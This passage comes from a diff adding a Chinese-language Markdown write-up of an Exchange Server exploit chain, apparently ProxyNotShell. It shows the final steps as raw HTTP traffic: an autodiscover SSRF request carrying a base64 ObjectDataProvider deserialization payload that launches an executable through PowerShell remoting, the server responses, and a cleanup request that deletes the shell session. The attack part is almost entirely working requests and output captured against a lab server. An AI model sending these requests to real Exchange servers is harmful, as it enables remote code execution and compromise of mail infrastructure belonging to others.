WludC5leGU8L1N5c3RlbTpTdHJpbmc+IDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+IDwvT2JqZWN0RGF0YVByb3ZpZGVyPiA8L1Jlc291cmNlRGljdGlvbmFyeT5dXT4KCQkJCQk8L1M+CgoJCQkJPC9PYmo+CgkJCTwvTVM+CgkJPC9PYmo+Cgk=</rsp:Arguments>
+        </rsp:CommandLine>
+</s:Body>
+</s:Envelope>
+```
+
+ - response
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/soap+xml;charset=UTF-8
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: c3f52c2f-ada3-402f-b035-e837b53c40aa
+X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
+X-AspNet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:28:40 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-FEServer: WIN-UPF09R7H264
+Date: Fri, 08 Sep 2023 09:28:39 GMT
+Content-Length: 537
+
+<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:0CBC5ED1-668F-47AB-8CBD-895723CAFF63</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>F09F9889-40BA-4A66-8B8F-BE91C03E8376</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
+```
+
+### step4
+
+攻击结束，移除SessionId
+
+ - request
+
+``` bash
+POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
+Host: 192.168.14.6
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Content-Type: application/soap+xml;charset=UTF-8
+Cookie: Email=autodiscover/admin@localhost
+Content-Length: 1375
+
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
+    <s:Header>
+        <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
+        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
+        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
+        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
+        <wsa:MessageID>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</wsa:MessageID>
+        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
+        <wsa:ReplyTo>
+            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
+        </wsa:ReplyTo>
+        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
+        <wsmv:SessionId s:mustUnderstand="false">uuid:c3e774b7-9f83-485c-aeed-7b58740c958b</wsmv:SessionId>
+        <wsa:To>http://ex01.lab.local/</wsa:To>
+        <wsman:SelectorSet>
+            <wsman:Selector Name="ShellId">8FCEBA08-6309-4EA7-B742-738E3803F596</wsman:Selector>
+        </wsman:SelectorSet>
+    </s:Header>
+    <s:Body />
+</s:Envelope>
+```
+
+ - response
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/soap+xml;charset=UTF-8
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: 1d876b8a-ede2-4066-a9d6-b5d98c826528
+X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
+X-AspNet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=; expires=Wed, 08-Sep-1993 12:12:48 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-FEServer: WIN-UPF09R7H264
+Date: Fri, 08 Sep 2023 12:12:47 GMT
+Content-Length: 452
+
+<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:FE680659-286C-4D5C-811B-2EB05B0A3D34</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:cf698888-a7a6-4c25-b5d3-72b30a0e1bfd</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
+```
 
  - 本地成功测试exchange版本:
 
